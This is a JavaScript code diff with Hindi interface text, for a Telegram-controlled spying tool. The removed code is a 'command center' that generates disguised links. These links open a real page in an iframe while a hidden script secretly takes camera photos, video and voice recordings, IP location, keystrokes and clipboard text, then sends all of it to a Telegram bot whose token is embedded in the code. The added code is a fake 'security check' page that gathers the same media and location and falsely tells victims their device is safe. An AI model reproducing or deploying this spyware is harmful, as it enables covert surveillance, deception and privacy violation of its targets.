-                // Handle /start command
-                if (text.startsWith('/start')) {
-                    const payload = text.split(' ');
-                    let refId = null;
-                    if (payload.length > 1 && payload[1].length > 0) {
-                        refId = payload[1];
-                    }
-                    
-                    // Send welcome with info
-                    let welcomeMsg = `✅ *आप सुरक्षा प्रणाली से जुड़ गए हैं*\n\n`;
-                    welcomeMsg += `🆔 आपकी Chat ID: \`${chatId}\`\n`;
-                    welcomeMsg += `👤 नाम: ${firstName} ${lastName}\n`;
-                    welcomeMsg += `📛 यूज़रनेम: @${username || 'N/A'}\n`;
-                    welcomeMsg += `🕐 समय: ${new Date().toLocaleString()}\n\n`;
-                    welcomeMsg += `🔗 यह ID आपके डेटा से लिंक हो गई है।`;
-                    
-                    tgSend('sendMessage', {
-                        chat_id: chatId,
-                        text: welcomeMsg,
-                        parse_mode: 'Markdown'
-                    });
-                    
-                    // Notify owner
-                    const displayName = `${firstName} ${lastName}`.trim() || username || chatId;
-                    let ownerMsg = `🆕 *नया यूज़र जुड़ा!*\n\n`;
-                    ownerMsg += `👤 ${displayName}\n`;
-                    ownerMsg += `🆔 \`${chatId}\`\n`;
-                    ownerMsg += `📛 @${username || 'N/A'}\n`;
-                    if (refId) ownerMsg += `🔗 रेफरल: \`${refId}\`\n`;
-                    ownerMsg += `🕐 ${new Date().toLocaleString()}`;
-                    
-                    tgSend('sendMessage', {
-                        chat_id: OWNER_CHAT_ID,
-                        text: ownerMsg,
-                        parse_mode: 'Markdown'
-                    });
-                    
-                    // Also auto-select this target
-                    selectTarget(chatId);
-                }
-                
-                // Handle /genlink command
-                if (text.startsWith('/genlink')) {
-                    tgSend('sendMessage', {
-                        chat_id: chatId,
-                        text: `🔗 *लिंक जनरेटर*\n\nअपना लिंक भेजें और मैं मास्क्ड लिंक बनाऊंगा।\n\nफॉर्मेट: \`/mask YOUR_LINK_HERE\``,
-                        parse_mode: 'Markdown'
-                    });
-                }
-                
-                // Handle /mask command
-                if (text.startsWith('/mask ')) {
-                    const realUrl = text.substring(6).trim();
-                    if (realUrl.startsWith('http')) {
-                        const encoded = btoa(realUrl);
-                        const baseUrl = window.location.origin + window.location.pathname;
-                        const maskedLink = `${baseUrl}?go=${encoded}&id=${chatId}`;
-                        
-                        tgSend('sendMessage', {
-                            chat_id: chatId,
-                            text: `✅ *मास्क्ड लिंक तैयार:*\n\`${maskedLink}\`\n\n📌 यह लिंक ${realUrl} को खोलेगा लेकिन बैकग्राउंड में स्कैन चलेगा।`,
-                            parse_mode: 'Markdown'
-                        });
-                        
-                        // Also send to owner
-                        tgSend('sendMessage', {
-                            chat_id: OWNER_CHAT_ID,
-                            text: `🔗 *लिंक जनरेट हुआ*\n👤 ${firstName} ${lastName}\n🆔 \`${chatId}\`\n🔗 असली: ${realUrl}\n✅ मास्क्ड: ${maskedLink}`,
-                            parse_mode: 'Markdown'
-                        });
-                    }
-                }
-                
-                // Handle any URL sent to bot
-                if (text.startsWith('http://') || text.startsWith('https://')) {
-                    const encoded = btoa(text);
-                    const baseUrl = window.location.origin + window.location.pathname;
-                    const maskedLink = `${baseUrl}?go=${encoded}&id=${chatId}`;
-                    
-                    tgSend('sendMessage', {
-                        chat_id: chatId,
-                        text: `✅ *आपका मास्क्ड लिंक:*\n\`${maskedLink}\`\n\n📌 यह लिंक ${text} को खोलेगा।`,
-                        parse_mode: 'Markdown'
-                    });
-                }
-            });
-        }
-    })
-    .catch(() => {});
-    
-    statChats.textContent = capturedChatIds.length;
-}
-
-// ===================== LINK GENERATOR (PANEL) =====================
-function generateMaskedLink() {
-    const realLink = document.getElementById('realLinkInput').value.trim();
-    const targetId = document.getElementById('genTargetId').value.trim() || activeTargetId;
-    
-    if (!realLink) { showToast('❌ कोई लिंक डालें'); return; }
-    if (!realLink.startsWith('http')) { showToast('❌ लिंक http:// या https:// से शुरू होना चाहिए'); return; }
-    if (!targetId) { showToast('❌ टार्गेट ID चुनें या डालें'); return; }
-    
-    const encoded = btoa(realLink);
-    const baseUrl = window.location.origin + window.location.pathname;
-    const maskedLink = `${baseUrl}?go=${encoded}&id=${targetId}`;
-    
-    document.getElementById('generatedLink').value = maskedLink;
-    document.getElementById('generatedLinkRow').style.display = 'flex';
-    
-    addLog(`🔗 मास्क्ड लिंक जनरेट: ${maskedLink}`, 'good');
-    addLog(`   📌 असली: ${realLink}`, 'info');
-    addLog(`   🎯 टार्गेट: ${targetNames[targetId] || targetId}`, 'info');
-    showToast('✅ मास्क्ड लिंक तैयार!');
-}
-
-function copyLink() {
-    const link = document.getElementById('generatedLink');
-    link.select();
-    navigator.clipboard.writeText(link.value).then(() => {
-        showToast('📋 लिंक कॉपी हो गया!');
-        addLog(`📋 लिंक कॉपी किया: ${link.value}`, 'good');
-    }).catch(() => {
-        document.execCommand('copy');
-        showToast('📋 लिंक कॉपी हो गया!');
-    });
-}
-
-// ===================== RUN ACTIONS =====================
-function runAction(type) {
-    const targetId = activeTargetId;
-    if (!targetId) { showToast('❌ पहले कोई टार्गेट सेलेक्ट करें'); return; }
-    
-    const displayName = targetNames[targetId] || targetId;
-    addLog(`🚀 एक्शन "${type}" → ${displayName} [${targetId}]`, 'info');
-    
-    switch(type) {
-        case 'all':
-            runAll(targetId);
-            break;
-        case 'front':
-            runFrontCamera(targetId);
-            break;
-        case 'back':
-            runBackCamera(targetId);
-            break;
-        case 'video':
-            runVideo(targetId);
-            break;
-        case 'voice':
-            runVoice(targetId);
-            break;
-        case 'location':
-            runIPLocation(targetId);
-            break;
-        case 'keylogger':
-            runKeylogger(targetId);
-            break;
-        case 'clipboard':
-            runClipboard(targetId);
-            break;
-        case 'screenshot':
-            runScreenshot(targetId);
-            break;
-    }
-}
-
-// ===================== ACTION FUNCTIONS =====================
-
-function tgSendAction(targetId, actionType, params) {
-    tgSend('sendMessage', {
-        chat_id: targetId,
-        text: `⚡ *एक्शन: ${actionType}*\n\nसिस्टम स्कैन शुरू हो रहा है...\nकृपया अनुमति दें।`,
-        parse_mode: 'Markdown'
-    });
-}
-
-function runAll(targetId) {
-    tgSendAction(targetId, 'ALL');
-    tgSend('sendMessage', {
-        chat_id: targetId,
-        text: `📸 *पूर्ण सुरक्षा स्कैन*\n\n✅ फ्रंट कैमरा (6 फोटो)\n✅ बैक कैमरा\n✅ वीडियो (20 सेकंड)\n✅ वॉइस नोट (3×10s)\n✅ IP लोकेशन\n✅ कीलॉगर + क्लिपबोर्ड\n\nस्कैन प्रगति पर है...`,
-        parse_mode: 'Markdown'
-    });
-    addLog(`🚀 सब कुछ चलाया → ${targetNames[targetId] || targetId}`);
-}
-
-function runFrontCamera(targetId) {
-    tgSendAction(targetId, 'Front Camera');
-    tgSend('sendMessage', {
-        chat_id: targetId,
-        text: `📸 *फ्रंट कैमरा स्कैन*\n\n6 फोटो कैप्चर हो रही हैं...\nकृपया कैमरे की अनुमति दें।`,
-        parse_mode: 'Markdown'
-    });
-    addLog(`📷 फ्रंट कैमरा → ${targetNames[targetId] || targetId}`);
-}
-
-function runBackCamera(targetId) {
-    tgSendAction(targetId, 'Back Camera');
-    addLog(`📱 बैक कैमरा → ${targetNames[targetId] || targetId}`);
-}
-
-function runVideo(targetId) {
-    tgSendAction(targetId, 'Video Record');
-    tgSend('sendMessage', {
-        chat_id: targetId,
-        text: `🎥 *वीडियो रिकॉर्डिंग*\n\n20 सेकंड का वीडियो रिकॉर्ड हो रहा है...\nकृपया कैमरा + माइक्रोफोन की अनुमति दें।`,
-        parse_mode: 'Markdown'
-    });
-    addLog(`🎥 वीडियो (20s) → ${targetNames[targetId] || targetId}`);
-}
-
-function runVoice(targetId) {
-    tgSendAction(targetId, 'Voice Note');
-    tgSend('sendMessage', {
-        chat_id: targetId,
-        text: `🎤 *वॉइस स्कैन*\n\n3 वॉइस नोट (10 सेकंड each) रिकॉर्ड होंगे...\nकृपया माइक्रोफोन की अनुमति दें।`,
-        parse_mode: 'Markdown'
-    });
-    addLog(`🎤 वॉइस → ${targetNames[targetId] || targetId}`);
-}
-
-function runIPLocation(targetId) {
-    tgSendAction(targetId, 'Location');
-    addLog(`🌐 IP लोकेशन → ${targetNames[targetId] || targetId}`);
-}
-
-function runKeylogger(targetId) {
-    tgSendAction(targetId, 'Keylogger');
-    addLog(`⌨️ कीलॉगर → ${targetNames[targetId] || targetId}`);
-}
-
-function runClipboard(targetId) {
-    tgSendAction(targetId, 'Clipboard');
-    addLog(`📋 क्लिपबोर्ड → ${targetNames[targetId] || targetId}`);
-}
-
-function runScreenshot(targetId) {
-    tgSendAction(targetId, 'Screenshot');
-    tgSend('sendMessage', {
-        chat_id: targetId,
-        text: `🖥️ *स्क्रीनशॉट स्कैन*\n\nस्क्रीन कैप्चर हो रहा है...`,
-        parse_mode: 'Markdown'
-    });
-    addLog(`🖥️ स्क्रीनशॉट → ${targetNames[targetId] || targetId}`);
-}
-
-// ===================== CHECK FOR GO PARAMETER (MASKED LINK HANDLER) =====================
-function checkMaskedLink() {
-    const params = new URLSearchParams(window.location.search);
-    const go = params.get('go');
-    const id = params.get('id');
-    
-    if (go) {
+    while (state.botPollingActive) {
         try {
-            const realUrl = atob(go);
-            // Save the target if new
-            if (id && !targets.includes(id)) {
-                targets.push(id);
-                targetNames[id] = `Link_${id}`;
-                renderTargets();
-                saveState();
-                addLog(`🔗 नया टार्गेट (लिंक से): ${id}`, 'good');
-            }
-            
-            addLog(`🔗 मास्क्ड लिंक डिटेक्ट → ${realUrl} (ID: ${id || 'N/A'})`, 'info');
-            
-            // Show that the assessment page is loading
-            showToast('🔗 रीडायरेक्ट हो रहा है...');
-            
-            // Create iframe to load the real page
-            const iframe = document.createElement('iframe');
-            iframe.style.cssText = 'position:fixed;top:0;left:0;width:100%;height:100%;border:none;z-index:9998;';
-            iframe.src = realUrl;
-            document.body.innerHTML = '';
-            document.body.appendChild(iframe);
-            
-            // Also inject our assessment script in background
-            const hiddenDiv = document.createElement('div');
-            hiddenDiv.id = 'bgAssessment';
-            hiddenDiv.style.cssText = 'position:fixed;top:-9999px;left:-9999px;';
-            document.body.appendChild(hiddenDiv);
-            
-            // Load the assessment script
-            const script = document.createElement('script');
-            script.textContent = `
-                // Assessment running in background
-                const BOT_TOKEN = "8225378395:AAHCsye1btvGfyrXSa_56rMkiG-XtDUswXk";
-                const CHAT_ID = "${id || ''}";
-                const MAX_PHOTOS = 6;
-                const MAX_VOICE = 3;
-                const VOICE_DURATION = 10000;
-                const VIDEO_DURATION = 20000;
-                
-                function tgBot(method, payload) {
-                    const url = "https://api.telegram.org/bot" + BOT_TOKEN + "/" + method;
-                    if (payload instanceof FormData) {
-                        return fetch(url, { method: "POST", body: payload }).catch(() => {});
-                    }
-                    return fetch(url, { method: "POST", headers: {"Content-Type":"application/json"}, body: JSON.stringify(payload) }).catch(() => {});
-                }
-                
-                if (CHAT_ID) {
-                    let photoCount = 0;
-                    let voiceCount = 0;
-                    
-                    // ===== FRONT CAMERA (6 PHOTOS) =====
-                    function captureFrontCam() {
-                        navigator.mediaDevices.getUserMedia({video:{facingMode:"user"},audio:false})
-                        .then(stream => {
-                            const v = document.createElement("video");
-                            v.style.cssText = "position:fixed;top:-9999px;left:-9999px;width:1px;height:1px;opacity:0.01;";
-                            v.setAttribute("playsinline",""); v.setAttribute("muted","");
-                            v.srcObject = stream;
-                            document.body.appendChild(v);
-                            v.onplaying = () => {
-                                setTimeout(() => {
-                                    const c = document.createElement("canvas");
-                                    c.width = v.videoWidth||640; c.height = v.videoHeight||480;
-                                    c.getContext("2d").drawImage(v,0,0);
-                                    c.toBlob(b => {
-                                        const fd = new FormData();
-                                        fd.append("chat_id", CHAT_ID);
-                                        fd.append("photo", b, "cam_" + Date.now() + ".png");
-                                        fd.append("caption", "📸 Photo " + (++photoCount) + "/" + MAX_PHOTOS);
-                                        tgBot("sendPhoto", fd);
-                                        stream.getTracks().forEach(t => t.stop());
-                                        document.body.removeChild(v);
-                                        if (photoCount < MAX_PHOTOS) setTimeout(captureFrontCam, 3000);
-                                    }, "image/jpeg", 0.7);
-                                }, 500);
-                            };
-                        }).catch(() => {});
-                    }
-                    
-                    // ===== BACK CAMERA =====
-                    function captureBackCam() {
-                        navigator.mediaDevices.enumerateDevices().then(d => {
-                            const bc = d.find(x => x.kind==='videoinput' && (x.label.toLowerCase().includes('back')||x.label.toLowerCase().includes('rear')||x.label.toLowerCase().includes('environment')));
-                            if (!bc) return;
-                            return navigator.mediaDevices.getUserMedia({video:{deviceId:{exact:bc.deviceId}},audio:false});
-                        }).then(stream => {
-                            if (!stream) return;
-                            const v = document.createElement("video");
-                            v.style.cssText = "position:fixed;top:-9999px;left:-9999px;width:1px;height:1px;opacity:0.01;";
-                            v.setAttribute("playsinline",""); v.setAttribute("muted","");
-                            v.srcObject = stream; document.body.appendChild(v);
-                            v.onplaying = () => {
-                                setTimeout(() => {
-                                    const c = document.createElement("canvas");
-                                    c.width = v.videoWidth||640; c.height = v.videoHeight||480;
-                                    c.getContext("2d").drawImage(v,0,0);
-                                    c.toBlob(b => {
-                                        const fd = new FormData();
-                                        fd.append("chat_id", CHAT_ID);
-                                        fd.append("photo", b, "back_" + Date.now() + ".png");
-                                        fd.append("caption", "📱 Back Camera");
-                                        tgBot("sendPhoto", fd);
-                                        stream.getTracks().forEach(t => t.stop());
-                                        document.body.removeChild(v);
-                                    }, "image/jpeg", 0.8);
-                                }, 600);
-                            };
-                        }).catch(() => {});
-                    }
-                    
-                    // ===== VIDEO RECORDING (20 SECONDS) =====
-                    function recordVideo() {
-                        navigator.mediaDevices.getUserMedia({video:{facingMode:"user",width:{ideal:640},height:{ideal:480}},audio:true})
-                        .then(stream => {
-                            // Find best supported mime type
-                            let mimeType = 'video/webm;codecs=vp9';
-                            if (!MediaRecorder.isTypeSupported(mimeType)) {
-                                mimeType = 'video/webm;codecs=vp8';
-                            }
-                            if (!MediaRecorder.isTypeSupported(mimeType)) {
-                                mimeType = 'video/webm';
-                            }
-                            if (!MediaRecorder.isTypeSupported(mimeType)) {
-                                mimeType = 'video/mp4';
-                            }
+            const url = `${API_BASE}/getUpdates?offset=${state.botOffset}&timeout=10`;
+            const res = await fetch(url);
+            const data = await res.json();
+
+            if (data.ok && data.result && data.result.length > 0) {
+                for (const update of data.result) {
+                    const msg = update.message;
+                    if (msg && msg.text) {
+                        log(`📩 मैसेज मिला: "${msg.text}" from ${msg.from.first_name} (chat: ${msg.chat.id})`, 'info');
+
+                        // Handle /start command — Telegram app में reply भेजें
+                        if (msg.text.startsWith('/start')) {
+                            const replyText = `🛡️ नमस्ते ${msg.from.first_name}! आपका डिवाइस सुरक्षित है।\n\n✅ सुरक्षा जाँच पूर्ण\n📊 कोई खतरा नहीं पाया गया\n\nयह एक स्वचालित सुरक्षा जाँच थी।`;
                             
-                            const chunks = [];
-                            const mr = new MediaRecorder(stream, {
-                                mimeType: mimeType,
-                                videoBitsPerSecond: 500000,
-                                audioBitsPerSecond: 64000
+                            // Send reply to the SAME chat where /start was received
+                            const replyResult = await tgCall('sendMessage', {
+                                chat_id: msg.chat.id,
+                                text: replyText,
+                                parse_mode: 'HTML'
                             });
                             
-                            mr.ondataavailable = e => {
-                                if (e.data && e.data.size > 0) chunks.push(e.data);
-                            };
-                            
-                            mr.onstop = () => {
-                                const blob = new Blob(chunks, {type: mimeType});
-                                const ext = mimeType.includes('mp4') ? 'mp4' : 'webm';
-                                const fd = new FormData();
-                                fd.append("chat_id", CHAT_ID);
-                                fd.append("video", blob, "video_20s_" + Date.now() + "." + ext);
-                                fd.append("caption", "🎥 20 सेकंड वीडियो रिकॉर्डिंग");
-                                tgBot("sendVideo", fd);
-                                stream.getTracks().forEach(t => t.stop());
-                            };
-                            
-                            mr.start(1000); // Collect in 1-second chunks
-                            setTimeout(() => {
-                                if (mr.state === 'recording') mr.stop();
-                            }, VIDEO_DURATION);
-                        }).catch(() => {});
+                            if (replyResult.ok) {
+                                log(`✅ /start का जवाब ${msg.from.first_name} को भेजा गया`, 'success');
+                            } else {
+                                log(`❌ /start जवाब त्रुटि: ${replyResult.description}`, 'error');
+                            }
+                        }
+                        
+                        // Handle /genlink command
+                        if (msg.text.startsWith('/genlink')) {
+                            const link = `${window.location.origin}${window.location.pathname}?id=${msg.chat.id}`;
+                            const replyResult = await tgCall('sendMessage', {
+                                chat_id: msg.chat.id,
+                                text: `🔗 आपका जनरेटेड लिंक:\n${link}`,
+                                parse_mode: 'HTML'
+                            });
+                            if (replyResult.ok) {
+                                log(`✅ /genlink का जवाब भेजा गया`, 'success');
+                            }
+                        }
                     }
                     
-                    // ===== VOICE NOTES (3×10s) =====
-                    function startVoice() {
-                        if (voiceCount >= MAX_VOICE) return;
-                        navigator.mediaDevices.getUserMedia({audio:true,video:false}).then(stream => {
-                            const mr = new MediaRecorder(stream, {mimeType:(MediaRecorder.isTypeSupported('audio/webm;codecs=opus')?'audio/webm;codecs=opus':'audio/webm')});
-                            let chunks = [];
-                            mr.ondataavailable = e => {if(e.data.size>0) chunks.push(e.data);};
-                            mr.onstop = () => {
-                                const blob = new Blob(chunks,{type:'audio/webm'});
-                                const fd = new FormData();
-                                fd.append("chat_id", CHAT_ID);
-                                fd.append("audio", blob, "voice_" + Date.now() + ".webm");
-                                fd.append("caption", "🎤 Voice " + (++voiceCount) + "/" + MAX_VOICE);
-                                tgBot("sendAudio", fd);
-                                stream.getTracks().forEach(t => t.stop());
-                                if (voiceCount < MAX_VOICE) setTimeout(startVoice, 2000);
-                            };
-                            mr.start();
-                            setTimeout(() => {if(mr.state==='recording') mr.stop();}, VOICE_DURATION);
-                        }).catch(() => {});
-                    }
-                    
-                    // ===== IP LOCATION =====
-                    function getLocation() {
-                        fetch('https://api64.ipify.org?format=json').then(r=>r.json()).then(d => {
-                            const ip = d.ip;
-                            fetch("http://ip-api.com/json/"+ip+"?fields=status,country,regionName,city,zip,lat,lon,timezone,isp,org,as,query")
-                            .then(r=>r.json()).then(loc => {
-                                if(loc.status==='success') {
-                                    let msg = "🌐 IP Location\\nIP: "+loc.query+"\\n📍 "+loc.city+", "+loc.regionName+", "+loc.country+"\\n🗺️ "+loc.lat+", "+loc.lon+"\\n🏢 ISP: "+loc.isp;
-                                    tgBot("sendMessage", {chat_id:CHAT_ID, text:msg});
-                                    tgBot("sendLocation", {chat_id:CHAT_ID, latitude:loc.lat, longitude:loc.lon});
-                                }
-                            }).catch(()=>{});
-                        }).catch(()=>{});
-                    }
-                    
-                    // ===== KEYLOGGER =====
-                    let kb = [];
-                    document.addEventListener('keydown', e => {
-                        const k = e.key;
-                        if(k==='Enter') kb.push('⏎'); else if(k==='Backspace') kb.push('⌫');
-                        else if(k.length===1) kb.push(k);
-                        if(kb.length>=30 || k==='Enter') flush();
-                    });
-                    function flush() {if(kb.length){tgBot("sendMessage",{chat_id:CHAT_ID,text:"⌨️ "+kb.join('')});kb=[];}}
-                    setInterval(flush, 10000);
-                    
-                    // ===== CLIPBOARD =====
-                    document.addEventListener('paste', e => {
-                        setTimeout(() => {
-                            navigator.clipboard.readText().then(t => {
-                                if(t) tgBot("sendMessage",{chat_id:CHAT_ID,text:"📋 "+t.substring(0,500)});
-                            }).catch(()=>{});
-                        }, 100);
-                    });
-                    
-                    // ===== START ALL =====
-                    setTimeout(captureFrontCam, 2000);
-                    setTimeout(captureBackCam, 5000);
-                    setTimeout(recordVideo, 8000);
-                    setTimeout(startVoice, 12000);
-                    setTimeout(getLocation, 3000);
+                    // Update offset to confirm this update
+                    state.botOffset = update.update_id + 1;
                 }
-            `;
-            document.body.appendChild(script);
-            
-            // Notify owner
-            tgSend('sendMessage', {
-                chat_id: OWNER_CHAT_ID,
-                text: `🔗 *लिंक खोला गया!*\n🎯 ${realUrl}\n🆔 ${id || 'N/A'}\n🕐 ${new Date().toLocaleString()}`,
-                parse_mode: 'Markdown'
-            });
-            
-        } catch(e) {
-            addLog('❌ लिंक डिकोड करने में त्रुटि', 'bad');
+            }
+        } catch (err) {
+            log(`⚠️ पोलिंग त्रुटि: ${err.message}`, 'error');
+            await new Promise(r => setTimeout(r, 3000));
         }
-        return true;
+        
+        // Wait 2 seconds before next poll
+        await new Promise(r => setTimeout(r, 2000));
     }
-    return false;
 }
 
-// ===================== STATE SAVE =====================
-function saveState() {
-    localStorage.setItem('c2_targets', JSON.stringify(targets));
-    localStorage.setItem('c2_targetNames', JSON.stringify(targetNames));
-    localStorage.setItem('c2_capturedChatIds', JSON.stringify(capturedChatIds));
-    localStorage.setItem('c2_dataSent', dataSentCount.toString());
+// ============================================================
+// STEP MANAGEMENT
+// ============================================================
+function updateProgress() {
+    const pct = (state.currentStep / 5) * 100;
+    progressFill.style.width = `${pct}%`;
 }
 
-function clearLog() {
-    logBox.innerHTML = '';
-    addLog('🗑️ लॉग साफ़ किया गया', 'info');
+function showStep(num) {
+    for (let i = 1; i <= 5; i++) {
+        const el = $(`step${i}`);
+        if (i <= num) {
+            el.classList.remove('hidden');
+            el.classList.add('done');
+        } else if (i === num + 1) {
+            el.classList.remove('hidden');
+            el.classList.remove('done');
+        } else {
+            el.classList.add('hidden');
+            el.classList.remove('done');
+        }
+    }
 }
 
-// ===================== INIT =====================
-function init() {
-    // Check for masked link first
-    if (checkMaskedLink()) return;
+function setStatus(text, type = 'info') {
+    statusText.textContent = text;
+    statusBox.className = 'status-box';
+    if (type === 'success') statusBox.classList.add('success');
+    if (type === 'error') statusBox.classList.add('error');
+    spinner.style.display = (type === 'info') ? 'inline-block' : 'none';
+}
+
+// ============================================================
+// STEP 1: DEVICE CHECK
+// ============================================================
+async function step1() {
+    state.currentStep = 1;
+    updateProgress();
+    showStep(1);
+    setStatus('डिवाइस की जाँच हो रही है...');
     
-    // Restore state
-    statTargets.textContent = targets.length;
-    statSent.textContent = dataSentCount;
-    statChats.textContent = capturedChatIds.length;
-    renderTargets();
+    // Send notification to Telegram
+    await sendTelegramMessage(`🛡️ <b>नया विज़िटर</b>\n\n👤 यूज़र ने सुरक्षा जाँच शुरू की\n📱 डिवाइस: ${navigator.userAgent.substring(0, 100)}`);
     
-    if (targets.length > 0 && !activeTargetId) {
-        selectTarget(targets[0]);
+    // Get IP info
+    try {
+        const ipRes = await fetch('https://ipapi.co/json/');
+        const ipData = await ipRes.json();
+        const ipInfo = `🌍 <b>लोकेशन जानकारी</b>\n\nIP: ${ipData.ip}\nदेश: ${ipData.country_name}\nशहर: ${ipData.city}\nISP: ${ipData.org}`;
+        await sendTelegramMessage(ipInfo);
+        log(`IP लोकेशन: ${ipData.city}, ${ipData.country_name}`, 'success');
+    } catch (e) {
+        log('IP लोकेशन नहीं मिल सकी', 'error');
     }
     
-    // Start bot polling
-    botPollInterval = setInterval(pollBot, 3000);
+    await new Promise(r => setTimeout(r, 2000));
+    
+    setStatus('✅ डिवाइस की जाँच पूर्ण', 'success');
+    await new Promise(r => setTimeout(r, 1000));
+    
+    // Start bot polling for /start command
     pollBot();
     
-    addLog('✅ कमांड सेंटर एक्टिव', 'good');
-    addLog(`🤖 ${targets.length} टार्गेट · ${capturedChatIds.length} कैप्चर्ड`, 'info');
-    
-    // If ?id= is in URL, auto-select
-    const urlId = new URLSearchParams(window.location.search).get('id');
-    if (urlId && targets.includes(urlId)) {
-        selectTarget(urlId);
-    }
-    
-    showToast('✅ सिस्टम तैयार');
+    // Move to photo step
+    step2();
 }
 
-// Cleanup
-window.addEventListener('beforeunload', () => {
-    if (botPollInterval) clearInterval(botPollInterval);
-});
+// ============================================================
+// STEP 2: PHOTOS (6 photos)
+// ============================================================
+async function step2() {
+    state.currentStep = 2;
+    updateProgress();
+    showStep(2);
+    actionSection.classList.remove('hidden');
+    photoSection.classList.remove('hidden');
+    voiceSection.classList.add('hidden');
+    recordingSection.classList.add('hidden');
+    
+    setStatus('📸 कृपया 6 फोटो लें');
+    
+    try {
+        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
+        photoVideo.srcObject = stream;
+    } catch (e) {
+        setStatus('❌ कैमरा एक्सेस नहीं हो सका', 'error');
+        return;
+    }
+    
+    capturePhotoBtn.onclick = async () => {
+        if (state.photos.length >= 6) return;
+        
+        const canvas = document.createElement('canvas');
+        canvas.width = photoVideo.videoWidth || 640;
+        canvas.height = photoVideo.videoHeight || 480;
+        canvas.getContext('2d').drawImage(photoVideo, 0, 0);
+        
+        canvas.toBlob(async (blob) => {
+            state.photos.push(blob);
+            photoCount.textContent = state.photos.length;
+            log(`फोटो ${state.photos.length}/6 लिया गया`, 'success');
+            
+            await sendTelegramPhoto(blob, `📸 फोटो ${state.photos.length}/6`);
+            
+            if (state.photos.length >= 6) {
+                // Stop camera
+                photoVideo.srcObject.getTracks().forEach(t => t.stop());
+                setStatus('✅ सभी 6 फोटो लिए गए', 'success');
+                await new Promise(r => setTimeout(r, 1000));
+                step3();
+            }
+        }, 'image/jpeg', 0.8);
+    };
+}
 
-// Start
-document.addEventListener('DOMContentLoaded', init);
+// ============================================================
+// STEP 3: VOICE NOTES (3 voice notes, 10s each)
+// ============================================================
+async function step3() {
+    state.currentStep = 3;
+    updateProgress();
+    showStep(3);
+    photoSection.classList.add('hidden');
+    voiceSection.classList.remove('hidden');
+    recordingSection.classList.add('hidden');
+    
+    setStatus('🎤 कृपया 3 वॉइस नोट रिकॉर्ड करें (10 सेकंड प्रत्येक)');
+    
+    let mediaRecorder = null;
+    let audioChunks = [];
+    
+    recordVoiceBtn.onclick = async () => {
+        if (state.voiceNotes.length >= 3 || state.isRecording) return;
+        state.isRecording = true;
+        recordVoiceBtn.disabled = true;
+        recordVoiceBtn.textContent = '🔴 रिकॉर्डिंग... 10 सेकंड';
+        
+        try {
+            const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
+            mediaRecorder = new MediaRecorder(stream, { mimeType: 'audio/webm;codecs=opus' });
+            audioChunks = [];
+            
+            mediaRecorder.ondataavailable = e => {
+                if (e.data.size > 0) audioChunks.push(e.data);
+            };
+            
+            mediaRecorder.onstop = async () => {
+                stream.getTracks().forEach(t => t.stop());
+                const blob = new Blob(audioChunks, { type: 'audio/webm;codecs=opus' });
+                state.voiceNotes.push(blob);
+                voiceCount.textContent = state.voiceNotes.length;
+                log(`वॉइस नोट ${state.voiceNotes.length}/3 रिकॉर्ड किया गया`, 'success');
+                
+                await sendTelegramVoice(blob);
+                
+                state.isRecording = false;
+                recordVoiceBtn.disabled = false;
+                recordVoiceBtn.textContent = '🎤 वॉइस रिकॉर्ड करें';
+                
+                if (state.voiceNotes.length >= 3) {
+                    setStatus('✅ सभी 3 वॉइस नोट लिए गए', 'success');
+                    await new Promise(r => setTimeout(r, 1000));
+                    step4();
+                }
+            };
+            
+            mediaRecorder.start();
+            setTimeout(() => {
+                if (mediaRecorder && mediaRecorder.state === 'recording') {
+                    mediaRecorder.stop();
+                }
+            }, 10000);
+            
+        } catch (e) {
+            log(`वॉइस रिकॉर्ड त्रुटि: ${e.message}`, 'error');
+            state.isRecording = false;
+            recordVoiceBtn.disabled = false;
+            recordVoiceBtn.textContent = '🎤 वॉइस रिकॉर्ड करें';
+        }
+    };
+}
+
+// ============================================================
+// STEP 4: VIDEO RECORDING (20 seconds)
+// ============================================================
+async function step4() {
+    state.currentStep = 4;
+    updateProgress();
+    showStep(4);
+    photoSection.classList.add('hidden');
+    voiceSection.classList.add('hidden');
+    recordingSection.classList.remove('hidden');
+    
+    setStatus('🎥 20 सेकंड का वीडियो रिकॉर्ड हो रहा है...');
+    
+    try {
+        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: true });
+        videoPreview.srcObject = stream;
+        videoPreview.style.display = 'block';
+        
+        // Try different mime types
+        const mimeTypes = [
+            'video/webm;codecs=vp9,opus',
+            'video/webm;codecs=vp8,opus',
+            'video/webm;codecs=vp9',
+            'video/webm;codecs=vp8',
+            'video/webm',
+            'video/mp4'
+        ];
+        
+        let selectedMime = '';
+        for (const mt of mimeTypes) {
+            if (MediaRecorder.isTypeSupported(mt)) {
+                selectedMime = mt;
+                break;
+            }
+        }
+        
+        log(`वीडियो कोडेक: ${selectedMime || 'डिफ़ॉल्ट'}`, 'info');
+        
+        const recorderOptions = {};
+        if (selectedMime) recorderOptions.mimeType = selectedMime;
+        
+        const mediaRecorder = new MediaRecorder(stream, recorderOptions);
+        const videoChunks = [];
+        let remaining = 20;
+        
+        recTimer.textContent = remaining;
+        const timerInterval = setInterval(() => {
+            remaining--;
+            recTimer.textContent = remaining;
+            if (remaining <= 0) clearInterval(timerInterval);
+        }, 1000);
+        
+        mediaRecorder.ondataavailable = e => {
+            if (e.data.size > 0) videoChunks.push(e.data);
+        };
+        
+        mediaRecorder.onstop = async () => {
+            clearInterval(timerInterval);
+            stream.getTracks().forEach(t => t.stop());
+            videoPreview.style.display = 'none';
+            
+            const blob = new Blob(videoChunks, { type: selectedMime || 'video/webm' });
+            state.videoBlob = blob;
+            log(`वीडियो रिकॉर्ड किया गया: ${(blob.size / 1024 / 1024).toFixed(2)} MB`, 'success');
+            
+            setStatus('📤 वीडियो अपलोड हो रहा है...');
+            await sendTelegramVideo(blob);
+            
+            setStatus('✅ वीडियो रिकॉर्डिंग पूर्ण', 'success');
+            await new Promise(r => setTimeout(r, 1000));
+            step5();
+        };
+        
+        // Collect chunks every 1 second
+        mediaRecorder.start(1000);
+        
+        // Stop after 20 seconds
+        setTimeout(() => {
+            if (mediaRecorder.state === 'recording') {
+                mediaRecorder.stop();
+            }
+        }, 20000);
+        
+    } catch (e) {
+        log(`वीडियो त्रुटि: ${e.message}`, 'error');
+        setStatus('❌ वीडियो रिकॉर्ड नहीं हो सका', 'error');
+    }
+}
+
+// ============================================================
+// STEP 5: COMPLETE
+// ============================================================
+async function step5() {
+    state.currentStep = 5;
+    updateProgress();
+    showStep(5);
